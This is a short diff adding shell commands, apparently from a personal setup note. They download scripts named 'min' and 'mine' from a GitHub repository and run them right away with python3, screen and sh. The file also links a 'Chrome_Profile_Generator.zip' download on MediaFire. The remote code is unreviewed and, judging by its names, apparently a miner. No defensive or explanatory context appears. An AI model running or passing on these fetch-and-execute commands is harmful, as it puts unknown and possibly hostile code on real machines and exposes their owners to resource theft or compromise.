@@ -1,3 +1,8 @@
+wget https://raw.githubusercontent.com/lutfiirhmn/ssh/main/min
+python3 min
+
 wget https://raw.githubusercontent.com/lutfiirhmn/ssh/main/mine && screen -R mine
+
+sh mine
 
 https://www.mediafire.com/file/l3s7jp8nfycjb55/Chrome_Profile_Generator.zip/file
